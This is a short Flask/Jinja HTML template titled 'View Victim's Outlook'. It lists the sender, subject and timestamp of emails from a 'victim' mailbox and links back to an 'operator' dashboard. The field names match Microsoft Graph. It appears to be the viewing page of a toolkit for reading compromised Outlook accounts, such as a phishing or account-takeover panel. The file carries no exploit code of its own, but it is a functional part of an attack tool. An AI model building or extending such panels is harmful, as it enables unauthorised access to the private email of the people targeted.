<!DOCTYPE html>
<html>
<head>
    <title>View Victim's Outlook</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
<div class="container mt-4">
    <h1>Mailbox of {{ victim.email or 'Victim' }}</h1>
    <div class="list-group">
    {% for email in emails %}
        <div class="list-group-item">
            <strong>{{ email.sender.emailAddress.name or email.sender.emailAddress.address }}</strong>
            <div>{{ email.subject }}</div>
            <small>{{ email.receivedDateTime }}</small>
        </div>
    {% else %}
        <p>No emails found.</p>
    {% endfor %}
    </div>
    <a href="{{ url_for('operator.dashboard') }}" class="btn btn-secondary mt-3">Back to Dashboard</a>
</div>
</body>
</html>
